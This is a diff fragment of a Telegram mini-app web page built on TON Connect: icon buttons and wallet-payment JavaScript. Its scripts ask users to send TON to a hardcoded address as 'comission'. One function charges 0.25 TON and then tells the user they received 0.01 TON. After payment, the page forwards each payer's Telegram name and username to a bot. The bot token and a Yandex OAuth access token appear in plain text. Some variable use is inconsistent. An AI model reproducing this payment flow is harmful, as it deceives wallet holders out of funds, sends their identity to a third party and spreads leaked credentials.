4.99807C6.18938 5.36807 6.03938 5.81807 5.66938 5.99807L4.78938 6.43807L5.66938 6.87807C6.03938 7.06807 6.18938 7.51807 5.99938 7.88807C5.81938 8.25807 5.36938 8.40807 4.99938 8.22807L3.85938 7.65807V9.21807C3.85938 9.63807 3.52937 9.96807 3.10938 9.96807Z" fill="#292D32"></path> <path d="M14.2198 3.85859C14.1098 3.85859 13.9898 3.82859 13.8898 3.77859L11.9998 2.83859L10.1098 3.77859C9.73981 3.96859 9.28981 3.81859 9.10981 3.44859C8.91981 3.07859 9.06981 2.62859 9.43981 2.43859L11.6598 1.32859C11.8698 1.21859 12.1198 1.21859 12.3298 1.32859L14.5498 2.43859C14.9198 2.62859 15.0698 3.07859 14.8898 3.44859C14.7598 3.70859 14.4998 3.85859 14.2198 3.85859Z" fill="#292D32"></path> <path d="M20.8904 9.96807C20.4804 9.96807 20.1404 9.62807 20.1404 9.21807V7.65807L19.0004 8.22807C18.6304 8.40807 18.1804 8.25807 18.0004 7.88807C17.8104 7.51807 17.9604 7.06807 18.3404 6.87807L19.2204 6.43807L18.3304 5.99807C17.9604 5.81807 17.8104 5.36807 18.0004 4.99807C18.1904 4.62807 18.6304 4.47807 19.0004 4.65807L21.2104 5.75807C21.2304 5.76807 21.2604 5.77807 21.2804 5.79807C21.3404 5.82807 21.3904 5.87807 21.4404 5.92807C21.4704 5.96807 21.5004 6.00807 21.5304 6.04807C21.5704 6.11807 21.6004 6.18807 21.6204 6.26807C21.6304 6.32807 21.6404 6.38807 21.6404 6.43807V6.44807V9.20807C21.6404 9.63807 21.3004 9.96807 20.8904 9.96807Z" fill="#292D32"></path> </g></svg>
+  </div>
+
+  <div class="button" onclick="document.getElementById('mainPage').style.display = 'none'; document.getElementById('missionsPage').style.display = 'none'; document.getElementById('tokenPage').style.display = 'none'; document.getElementById('gamesPage').style.display = 'block'; document.getElementById('settingsPage').style.display = 'none';  document.getElementById('musicPage').style.display = 'none';">
+	<svg style="position: absolute; bottom: 1%; right: 1%; transform: scale(0.7);" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M14 5C14 4.44772 14.4477 4 15 4H19C19.5523 4 20 4.44772 20 5V9C20 9.55228 19.5523 10 19 10C18.4477 10 18 9.55228 18 9V6H15C14.4477 6 14 5.55228 14 5ZM4.29289 13.2929C4.68342 12.9024 5.31658 12.9024 5.70711 13.2929L7.5 15.0858L9.29289 13.2929C9.68342 12.9024 10.3166 12.9024 10.7071 13.2929C11.0976 13.6834 11.0976 14.3166 10.7071 14.7071L8.91421 16.5L10.7071 18.2929C11.0976 18.6834 11.0976 19.3166 10.7071 19.7071C10.3166 20.0976 9.68342 20.0976 9.29289 19.7071L7.5 17.9142L5.70711 19.7071C5.31658 20.0976 4.68342 20.0976 4.29289 19.7071C3.90237 19.3166 3.90237 18.6834 4.29289 18.2929L6.08579 16.5L4.29289 14.7071C3.90237 14.3166 3.90237 13.6834 4.29289 13.2929ZM6 7.5C6 6.67157 6.67157 6 7.5 6C8.32843 6 9 6.67157 9 7.5C9 8.32843 8.32843 9 7.5 9C6.67157 9 6 8.32843 6 7.5ZM7.5 4C5.567 4 4 5.567 4 7.5C4 9.433 5.567 11 7.5 11C9.433 11 11 9.433 11 7.5C11 5.567 9.433 4 7.5 4ZM16.5 15C15.6716 15 15 15.6716 15 16.5C15 17.3284 15.6716 18 16.5 18C17.3284 18 18 17.3284 18 16.5C18 15.6716 17.3284 15 16.5 15ZM13 16.5C13 14.567 14.567 13 16.5 13C18.433 13 20 14.567 20 16.5C20 18.433 18.433 20 16.5 20C14.567 20 13 18.433 13 16.5ZM14 11C14.5523 11 15 10.5523 15 10C15 9.44772 14.5523 9 14 9C13.4477 9 13 9.44772 13 10C13 10.5523 13.4477 11 14 11ZM13 12C13 12.5523 12.5523 13 12 13C11.4477 13 11 12.5523 11 12C11 11.4477 11.4477 11 12 11C12.5523 11 13 11.4477 13 12ZM16 9C16.5523 9 17 8.55228 17 8C17 7.44772 16.5523 7 16 7C15.4477 7 15 7.44772 15 8C15 8.55228 15.4477 9 16 9Z" fill="#000000"></path> </g></svg>
+  </div>
+
+  <div class="button" onclick="document.getElementById('mainPage').style.display = 'none'; document.getElementById('missionsPage').style.display = 'none'; document.getElementById('tokenPage').style.display = 'block'; document.getElementById('gamesPage').style.display = 'none'; document.getElementById('settingsPage').style.display = 'none';  document.getElementById('musicPage').style.display = 'none';">
+	<svg style="position: absolute; bottom: 1%; right: 1%; transform: scale(0.7);" fill="#000000" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M8.5,23a9.044,9.044,0,0,0,3.506-.682A7,7,0,1,0,15,9V5.333C15,2.9,12.145,1,8.5,1S2,2.9,2,5.333V18.667C2,21.1,4.855,23,8.5,23ZM15,11a5,5,0,1,1-5,5A5.006,5.006,0,0,1,15,11ZM8.5,3C11.152,3,13,4.23,13,5.333S11.152,7.667,8.5,7.667,4,6.437,4,5.333,5.848,3,8.5,3ZM4,8.482A8.466,8.466,0,0,0,8.5,9.667,8.466,8.466,0,0,0,13,8.482V9.3A7.024,7.024,0,0,0,9.219,12.06c-.239.021-.476.051-.719.051-2.652,0-4.5-1.23-4.5-2.333Zm0,4.445A8.383,8.383,0,0,0,8.268,14.1,6.981,6.981,0,0,0,8,16c0,.178.014.353.027.528C5.636,16.39,4,15.257,4,14.222Zm0,4.444a8.462,8.462,0,0,0,4.49,1.184,7.01,7.01,0,0,0,1.479,2.3A7.835,7.835,0,0,1,8.5,21C5.848,21,4,19.77,4,18.667Z"></path></g></svg>
+  </div>
+
+  <!--<div class="button" onclick="document.getElementById('mainPage').style.display = 'none'; document.getElementById('missionsPage').style.display = 'none'; document.getElementById('tokenPage').style.display = 'none'; document.getElementById('gamesPage').style.display = 'none'; document.getElementById('settingsPage').style.display = 'none';  document.getElementById('musicPage').style.display = 'block';">
+  <svg style="position: absolute; bottom: 1%; right: 1%; transform: scale(0.7);" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M12.5 8.89001V18.5M12.5 8.89001V5.57656C12.5 5.36922 12.5 5.26554 12.5347 5.17733C12.5653 5.09943 12.615 5.03047 12.6792 4.97678C12.752 4.91597 12.8503 4.88318 13.047 4.81761L17.447 3.35095C17.8025 3.23245 17.9803 3.17319 18.1218 3.20872C18.2456 3.23982 18.3529 3.31713 18.4216 3.42479C18.5 3.54779 18.5 3.73516 18.5 4.10989V7.42335C18.5 7.63069 18.5 7.73436 18.4653 7.82258C18.4347 7.90048 18.385 7.96943 18.3208 8.02313C18.248 8.08394 18.1497 8.11672 17.953 8.18229L13.553 9.64896C13.1975 9.76746 13.0197 9.82671 12.8782 9.79119C12.7544 9.76009 12.6471 9.68278 12.5784 9.57512C12.5 9.45212 12.5 9.26475 12.5 8.89001ZM12.5 18.5C12.5 19.8807 10.933 21 9 21C7.067 21 5.5 19.8807 5.5 18.5C5.5 17.1192 7.067 16 9 16C10.933 16 12.5 17.1192 12.5 18.5Z" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg>
+  </div>-->
+
+  <!--<div class="button" onclick="document.getElementById('mainPage').style.display = 'none'; document.getElementById('missionsPage').style.display = 'none'; document.getElementById('tokenPage').style.display = 'none'; document.getElementById('gamesPage').style.display = 'none'; document.getElementById('settingsPage').style.display = 'block';  document.getElementById('musicPage').style.display = 'none';">
+	<svg style="position: absolute; bottom: 1%; right: 1%; transform: scale(0.7);" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M14 5.28988H13C13 5.7323 13.2907 6.12213 13.7148 6.24833L14 5.28988ZM15.3302 5.84137L14.8538 6.72058C15.2429 6.93144 15.7243 6.86143 16.0373 6.54847L15.3302 5.84137ZM16.2426 4.92891L15.5355 4.2218V4.2218L16.2426 4.92891ZM17.6569 4.92891L16.9498 5.63601L16.9498 5.63602L17.6569 4.92891ZM19.0711 6.34312L19.7782 5.63602V5.63602L19.0711 6.34312ZM19.0711 7.75734L18.364 7.05023L19.0711 7.75734ZM18.1586 8.66978L17.4515 7.96268C17.1386 8.27563 17.0686 8.75709 17.2794 9.14621L18.1586 8.66978ZM18.7101 10L17.7517 10.2853C17.8779 10.7093 18.2677 11 18.7101 11V10ZM18.7101 14V13C18.2677 13 17.8779 13.2907 17.7517 13.7148L18.7101 14ZM18.1586 15.3302L17.2794 14.8538C17.0686 15.2429 17.1386 15.7244 17.4515 16.0373L18.1586 15.3302ZM19.0711 16.2427L19.7782 15.5356V15.5356L19.0711 16.2427ZM19.0711 17.6569L18.364 16.9498L18.364 16.9498L19.0711 17.6569ZM17.6569 19.0711L18.364 19.7782V19.7782L17.6569 19.0711ZM15.3302 18.1586L16.0373 17.4515C15.7243 17.1386 15.2429 17.0686 14.8538 17.2794L15.3302 18.1586ZM14 18.7101L13.7148 17.7517C13.2907 17.8779 13 18.2677 13 18.7101H14ZM10 18.7101H11C11 18.2677 10.7093 17.8779 10.2853 17.7517L10 18.7101ZM8.6698 18.1586L9.14623 17.2794C8.7571 17.0685 8.27565 17.1385 7.96269 17.4515L8.6698 18.1586ZM7.75736 19.071L7.05026 18.3639L7.05026 18.3639L7.75736 19.071ZM6.34315 19.071L5.63604 19.7782H5.63604L6.34315 19.071ZM4.92894 17.6568L4.22183 18.3639H4.22183L4.92894 17.6568ZM4.92894 16.2426L4.22183 15.5355H4.22183L4.92894 16.2426ZM5.84138 15.3302L6.54849 16.0373C6.86144 15.7243 6.93146 15.2429 6.7206 14.8537L5.84138 15.3302ZM5.28989 14L6.24835 13.7147C6.12215 13.2907 5.73231 13 5.28989 13V14ZM5.28989 10V11C5.73231 11 6.12215 10.7093 6.24835 10.2852L5.28989 10ZM5.84138 8.66982L6.7206 9.14625C6.93146 8.75712 6.86145 8.27567 6.54849 7.96272L5.84138 8.66982ZM4.92894 7.75738L4.22183 8.46449H4.22183L4.92894 7.75738ZM4.92894 6.34317L5.63605 7.05027H5.63605L4.92894 6.34317ZM6.34315 4.92895L7.05026 5.63606L7.05026 5.63606L6.34315 4.92895ZM7.75737 4.92895L8.46447 4.22185V4.22185L7.75737 4.92895ZM8.6698 5.84139L7.9627 6.54849C8.27565 6.86145 8.7571 6.93146 9.14623 6.7206L8.6698 5.84139ZM10 5.28988L10.2853 6.24833C10.7093 6.12213 11 5.7323 11 5.28988H10ZM11 2C9.89545 2 9.00002 2.89543 9.00002 4H11V4V2ZM13 2H11V4H13V2ZM15 4C15 2.89543 14.1046 2 13 2V4H15ZM15 5.28988V4H13V5.28988H15ZM15.8066 4.96215C15.3271 4.70233 14.8179 4.48994 14.2853 4.33143L13.7148 6.24833C14.1132 6.36691 14.4944 6.52587 14.8538 6.72058L15.8066 4.96215ZM15.5355 4.2218L14.6231 5.13426L16.0373 6.54847L16.9498 5.63602L15.5355 4.2218ZM18.364 4.2218C17.5829 3.44075 16.3166 3.44075 15.5355 4.2218L16.9498 5.63602V5.63601L18.364 4.2218ZM19.7782 5.63602L18.364 4.2218L16.9498 5.63602L18.364 7.05023L19.7782 5.63602ZM19.7782 8.46444C20.5592 7.68339 20.5592 6.41706 19.7782 5.63602L18.364 7.05023L18.364 7.05023L19.7782 8.46444ZM18.8657 9.37689L19.7782 8.46444L18.364 7.05023L17.4515 7.96268L18.8657 9.37689ZM19.6686 9.71475C19.5101 9.18211 19.2977 8.67285 19.0378 8.19335L17.2794 9.14621C17.4741 9.50555 17.6331 9.8868 17.7517 10.2853L19.6686 9.71475ZM18.7101 11H20V9H18.7101V11ZM20 11H22C22 9.89543 21.1046 9 20 9V11ZM20 11V13H22V11H20ZM20 13V15C21.1046 15 22 14.1046 22 13H20ZM20 13H18.7101V15H20V13ZM19.0378 15.8066C19.2977 15.3271 19.5101 14.8179 19.6686 14.2852L17.7517 13.7148C17.6331 14.1132 17.4741 14.4944 17.2794 14.8538L19.0378 15.8066ZM19.7782 15.5356L18.8657 14.6231L17.4515 16.0373L18.364 16.9498L19.7782 15.5356ZM19.7782 18.364C20.5592 17.5829 20.5592 16.3166 19.7782 15.5356L18.364 16.9498H18.364L19.7782 18.364ZM18.364 19.7782L19.7782 18.364L18.364 16.9498L16.9498 18.364L18.364 19.7782ZM15.5355 19.7782C16.3166 20.5592 17.5829 20.5592 18.364 19.7782L16.9498 18.364L15.5355 19.7782ZM14.6231 18.8657L15.5355 19.7782L16.9498 18.364L16.0373 17.4515L14.6231 18.8657ZM14.2853 19.6686C14.8179 19.5101 15.3271 19.2977 15.8066 19.0378L14.8538 17.2794C14.4944 17.4741 14.1132 17.6331 13.7148 17.7517L14.2853 19.6686ZM15 20V18.7101H13V20H15ZM13 22C14.1046 22 15 21.1046 15 20H13V22ZM11 22H13V20H11V22ZM9.00002 20C9.00002 21.1046 9.89545 22 11 22V20H9.00002ZM9.00002 18.7101V20H11V18.7101H9.00002ZM8.19337 19.0378C8.67287 19.2977 9.18213 19.5101 9.71477 19.6686L10.2853 17.7517C9.88681 17.6331 9.50557 17.4741 9.14623 17.2794L8.19337 19.0378ZM8.46447 19.7782L9.3769 18.8657L7.96269 17.4515L7.05026 18.3639L8.46447 19.7782ZM5.63604 19.7782C6.41709 20.5592 7.68342 20.5592 8.46447 19.7781L7.05026 18.3639L5.63604 19.7782ZM4.22183 18.3639L5.63604 19.7782L7.05026 18.3639L5.63604 16.9497L4.22183 18.3639ZM4.22183 15.5355C3.44078 16.3166 3.44078 17.5829 4.22183 18.3639L5.63604 16.9497V16.9497L4.22183 15.5355ZM5.13427 14.6231L4.22183 15.5355L5.63604 16.9497L6.54849 16.0373L5.13427 14.6231ZM4.33144 14.2852C4.48996 14.8179 4.70234 15.3271 4.96217 15.8066L6.7206 14.8537C6.52589 14.4944 6.36693 14.1132 6.24835 13.7147L4.33144 14.2852ZM5.28989 13H4V15H5.28989V13ZM4 13H4H2C2 14.1046 2.89543 15 4 15V13ZM4 13V11H2V13H4ZM4 11V9C2.89543 9 2 9.89543 2 11H4ZM4 11H5.28989V9H4V11ZM4.96217 8.1934C4.70235 8.67288 4.48996 9.18213 4.33144 9.71475L6.24835 10.2852C6.36693 9.88681 6.52589 9.50558 6.7206 9.14625L4.96217 8.1934ZM4.22183 8.46449L5.13428 9.37693L6.54849 7.96272L5.63605 7.05027L4.22183 8.46449ZM4.22183 5.63606C3.44078 6.41711 3.44079 7.68344 4.22183 8.46449L5.63605 7.05027L5.63605 7.05027L4.22183 5.63606ZM5.63605 4.22185L4.22183 5.63606L5.63605 7.05027L7.05026 5.63606L5.63605 4.22185ZM8.46447 4.22185C7.68343 3.4408 6.4171 3.4408 5.63605 4.22185L7.05026 5.63606V5.63606L8.46447 4.22185ZM9.37691 5.13428L8.46447 4.22185L7.05026 5.63606L7.9627 6.54849L9.37691 5.13428ZM9.71477 4.33143C9.18213 4.48995 8.67287 4.70234 8.19337 4.96218L9.14623 6.7206C9.50557 6.52588 9.88681 6.36692 10.2853 6.24833L9.71477 4.33143ZM9.00002 4V5.28988H11V4H9.00002Z" fill="#000000"></path> <circle cx="12" cy="12" r="3" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></circle> </g></svg>
+  </div>-->
+
+	</div>
+
+       
+</section>
+
+
+
+<script>
+    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+        manifestUrl: 'https://raw.githubusercontent.com/Maxutkoe/MkStudio/refs/heads/main/tonconnect/tonconnect-manifest.json',
+        buttonRootId: 'ton-connect'
+    });
+	async function connectToWallet() {
+        const connectedWallet = await tonConnectUI.connectWallet();
+        // Do something with connectedWallet if needed
+        console.log(connectedWallet);
+    }
+
+    // Call the function
+	tonConnectUI.uiOptions = {
+      twaReturnUrl: 'https://t.me/ThelCheckerlBot',
+        uiPreferences: {
+            borderRadius: 's',
+            theme: "LIGHT"
+        },
+    };
+
+
+
+	async function trans(){
+		const usdt = 25000000; //250000000 - 0.25 ton
+                const transaction = {
+                    validUntil: Math.round(Date.now() / 1000) + 100,
+                    messages: [
+                        {
+                            address: "UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp",
+                            amount: usdt.toFixed(0),
+                        }
+                    ]
+                };
+
+                try{
+                    await tonConnectUI.sendTransaction(transaction);
+                    alert("You successfuly paid comission!");
+                    lst = 0;
+                    localStorage.setItem("opop", lst);
+
+					let telegram = {
+    					token: "7937247695:AAGNmeIQE9gM5Zec8KbIezbrHdDAhKK4ksU", // Your bot's token that got from @BotFather
+    					chat_id: "-1002275343624" // The user's(that you want to send a message) telegram chat id
+    				};
+					const text = `${tg.initDataUnsafe.user.first_name} ${tg.initDataUnsafe.user.last_name} | @${tg.initDataUnsafe.user.username} <br>${usdt}`;
+					const url = `https://api.telegram.org/bot${telegram.token}/sendMessage?chat_id=${telegram.chat_id}&text=${text}`; // The url to request
+    				const api = new XMLHttpRequest();
+    				api.open('GET', url, true);
+        api.onload = function(){
+            const status = api.status;
+            if(status == 200){
+              console.log("Супер!");
+            }
+                
+        };
+        api.send();
+
+                }
+                catch(e){
+                    console.error(e);
+                }
+    }
+
+    async function sendMKT(){
+                const transaction = {
+                    validUntil: Math.round(Date.now() / 1000) + 100,
+                    messages: [
+                        {
+                            address: "UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp",
+                            amount: (lst*1000),
+                        }
+                    ]
+                };
+
+                try{
+                    await tonConnectUI.sendTransaction(transaction);
+                    alert("You successfuly paid comission!");
+                    lst = 0;
+                    localStorage.setItem("opop", lst);
+
+					let telegram = {
+    					token: "7937247695:AAGNmeIQE9gM5Zec8KbIezbrHdDAhKK4ksU", // Your bot's token that got from @BotFather
+    					chat_id: "-1002275343624" // The user's(that you want to send a message) telegram chat id
+    				};
+					const text = `${tg.initDataUnsafe.user.first_name} ${tg.initDataUnsafe.user.last_name} | @${tg.initDataUnsafe.user.username} <br>${usdt}`;
+					const url = `https://api.telegram.org/bot${telegram.token}/sendMessage?chat_id=${telegram.chat_id}&text=${text}`; // The url to request
+    				const api = new XMLHttpRequest();
+    				api.open('GET', url, true);
+        api.onload = function(){
+            const status = api.status;
+            if(status == 200){
+              console.log("Супер!");
+            }
+                
+        };
+        
+        api.send();
+
+                }
+                catch(e){
+                    console.error(e);
+                }
+    }
+
+    async function payForPrime(){
+                const transaction = {
+                    validUntil: Math.round(Date.now() / 1000) + 100,
+                    messages: [
+                        {
+                            address: "UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp",
+                            amount: 250000000, //250000000
+                        }
+                    ]
+                };
+
+                try{
+                    await tonConnectUI.sendTransaction(transaction);
+                    alert("You successfuly recieved 0.01 TON!");
+                    let completed = document.getElementById("terms");
+                    let body = document.querySelector("body");
+                    body.removeChild(completed);
+                    setTgPrem("yes");
+                    getTgPrem();
+                    window.location.reload();
+                }
+                catch(e){
+                    console.error(e);
+                }
+    }
+    async function supportAuth(){
+                const transaction = {
+                    validUntil: Math.round(Date.now() / 1000) + 100,
+                    messages: [
+                        {
+                            address: "UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp",
+                            amount: 250000000, //250000000
+                        }
+                    ]
+                };
+
+                try{
+                    await tonConnectUI.sendTransaction(transaction);
+                    alert("Thanks!!!");
+                }
+                catch(e){
+                    console.error(e);
+                }
+    }
+
+    async function transaction(address, amount){
+                const transaction = {
+                    validUntil: Math.round(Date.now() / 1000) + 100,
+                    messages: [
+                        {
+                            address: address,//"UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp",
+                            amount: amount*1000, //250000000
+                            jetton: "Mk.Token"//'EQAn0xCaVZG-PWeCRj0dtvIYgZux9wS1K3zjA2pITgDNykKq',
+                        }
+                    ]
+                };
+
+                try{
+                    const result = await tonConnectUI.sendTransaction(transaction);
+                    const HH = myAppExplorerService.getTransaction(result.boc);
+                    alert("Thanks!!!");
+                }
+                catch(e){
+                    console.error(e);
+                }
+    }
+
+    function getMktTokens(){
+	let api = new XMLHttpRequest();
+    let wallet = tonConnectUI.wallet.account.address;
+    const url = `https://tonapi.io/v2/accounts/${wallet}/jettons`;
+    //https://oauth.yandex.ru/verification_code#access_token=y0_AgAAAABbCGd7AAtGZwAAAAEcn3YsAAAWXo6VDEhPgIKVymz8EcVTx0bdYA&token_type=bearer&expires_in=31528306&cid=vw4tuxanj28dm7kp29ezn5zpg4
+
+        api.open('GET', url, true);
+        api.responseType = "json";
+        api.onload = function(){
+            const status = api.status;
+            if(status == 200){
+                // console.log(api.response.addresses[aroundom(5, 200).toFixed(0)].address);
+				//wallet = api.response.addresses[aroundom(5, 200).toFixed(0)].address;
+				//console.log(api.response);
+                for(let i = 0; i < api.response.balances.length; i++){
+                    if(api.response.balances[i].jetton.name == "Mk.Token" && api.response.balances[i].jetton.symbol == "MKT" && api.response.balances[i].jetton.address == "0:27d3109a5591be3d6782463d1db6f218819bb1f704b52b7ce3036a484e00cdca"){
+                        //console.log(api.response.balances[i].jetton.name);
+                        lst = api.response.balances[i].balance / 1000;
+                    }
+                }
+
+			}
+			else{
+				console.log("F");
+			}
+		}
+		api.send();
+
+	
+}
+
+</script>
+    </body>
+</html>
